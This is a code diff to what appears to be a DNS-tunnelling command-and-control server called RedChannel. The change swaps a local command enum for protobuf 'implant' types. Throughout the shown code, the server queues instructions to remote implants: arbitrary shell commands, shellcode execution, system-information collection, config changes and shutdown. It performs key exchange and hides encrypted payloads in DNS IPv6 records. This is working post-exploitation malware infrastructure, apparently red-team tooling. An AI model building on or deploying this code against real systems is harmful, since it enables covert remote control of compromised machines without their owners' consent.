@@ -13,17 +13,7 @@ import AgentModule from "../modules/agent";
 import ProxyModule from "../modules/proxy";
 import C2Module from "../modules/c2";
 
-export enum AgentCommand {
-    AGENT_SYSINFO = 0x01,
-    AGENT_CHECKIN = 0x02,
-    AGENT_SHELL = 0x03,
-    AGENT_MSG = 0x04,
-    AGENT_EXEC_SC = 0x05,
-    AGENT_SHUTDOWN = 0x06,
-    AGENT_KEYX = 0x07,
-    AGENT_SET_CONFIG = 0x08,
-    AGENT_IGNORE = 0xff,
-}
+import { implant } from "../pb/implant";
 
 // to clarify the Map()s
 export type DataId = string;
@@ -43,7 +33,7 @@ export interface AgentModel {
     allowKeyx?: boolean;
     sendq: SendQ;
     // each agent command has a map of dataId => chunks[]
-    recvq: Map<AgentCommand, Map<DataId, DataChunk[]>>;
+    recvq: Map<implant.AgentCommand, Map<DataId, DataChunk[]>>;
 }
 
 // agent status hex string value to be appended to DNS response
@@ -151,7 +141,7 @@ export default class RedChannel {
                 channel: channel,
                 allowKeyx: false,
                 sendq: [],
-                recvq: new Map<AgentCommand, Map<DataId, DataChunk[]>>(),
+                recvq: new Map<implant.AgentCommand, Map<DataId, DataChunk[]>>(),
             });
         }
     }
@@ -183,14 +173,14 @@ export default class RedChannel {
         if (!agentId) {
             // broadcast keyx if no agent is specified
             for (const id of this.agents.keys()) {
-                this.queueData(id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+                this.queueData(id, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey);
             }
             this.log.info(`broadcasting keyx`);
             return;
         }
 
         if (this.agents.has(agentId)) {
-            this.queueData(agentId, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+            this.queueData(agentId, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey);
         } else {
             this.log.error(`agent ${agentId} does not exist`);
         }
@@ -201,15 +191,15 @@ export default class RedChannel {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(agentId, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
+        this.queueData(agentId, implant.AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
     }
 
     sendCommandShell(agentId: string, shellCommand: string) {
-        this.queueData(agentId, AgentCommand.AGENT_SHELL, shellCommand);
+        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE, shellCommand);
     }
 
     sendCommandExecShellcode(agentId: string, shellcode) {
-        this.queueData(agentId, AgentCommand.AGENT_EXEC_SC, shellcode);
+        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE_SHELLCODE, shellcode);
     }
 
     // agent must be able to decrypt the tag to execute shutdown
@@ -217,11 +207,11 @@ export default class RedChannel {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(agentId, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
+        this.queueData(agentId, implant.AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
     }
 
     sendCommandSetConfig(agentId: string, config: string) {
-        this.queueData(agentId, AgentCommand.AGENT_SET_CONFIG, config);
+        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, config);
     }
 
     /**
@@ -232,14 +222,14 @@ export default class RedChannel {
      * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
      *
      */
-    queueData(agentId: string, command: AgentCommand, data: string) {
+    queueData(agentId: string, command: implant.AgentCommand, data: string) {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
 
         let dataPayload: string = "";
 
         // keyx payload is just our key, unencrypted
-        if (command === AgentCommand.AGENT_KEYX) dataPayload = data;
+        if (command === implant.AgentCommand.AGENT_KEYX) dataPayload = data;
         else dataPayload = this.encryptPayload(data, agent.secret);
 
         const dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
@@ -324,7 +314,7 @@ export default class RedChannel {
         }
 
         // set to false after keyx is received and there are no more keyx in sendq
-        if (command == AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
+        if (command == implant.AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
 
         if (records.length > 0) {
             agent.sendq?.push(records);
@@ -367,7 +357,7 @@ export default class RedChannel {
     }
 
     makeIpString(last_byte) {
-        return `${Config.RECORD_HEADER_PREFIX}:0000:${AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
+        return `${Config.RECORD_HEADER_PREFIX}:0000:${implant.AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
     }
 
     /**
@@ -470,7 +460,7 @@ export default class RedChannel {
         }
 
         // no need to check the incoming data, just send a queued up msg
-        if (command == AgentCommand.AGENT_CHECKIN) {
+        if (command == implant.AgentCommand.AGENT_CHECKIN) {
             if (channel !== agent.channel) {
                 this.log.warn(`agent ${agentId} switching channel from ${agent.channel} to ${channel}`);
                 agent.channel = channel;
@@ -618,7 +608,7 @@ export default class RedChannel {
 
         let plaintext = "";
         switch (command) {
-            case AgentCommand.AGENT_KEYX:
+            case implant.AgentCommand.AGENT_KEYX:
                 if (!agent.allowKeyx) {
                     this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                     break;
@@ -651,9 +641,9 @@ export default class RedChannel {
                 this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);
 
                 // if there are no more queued up keyx's, ignore further keyxs from agent
-                if (!this.isCommandInSendQ(agentId, AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
+                if (!this.isCommandInSendQ(agentId, implant.AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
                 break;
-            case AgentCommand.AGENT_MSG:
+            case implant.AgentCommand.AGENT_MESSAGE:
                 try {
                     plaintext = this.decryptAgentData(agentId, data);
                 } catch (ex) {
@@ -662,7 +652,7 @@ export default class RedChannel {
                 }
                 this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
                 break;
-            case AgentCommand.AGENT_SYSINFO:
+            case implant.AgentCommand.AGENT_SYSINFO:
                 try {
                     plaintext = this.decryptAgentData(agentId, data);
                 } catch (ex) {
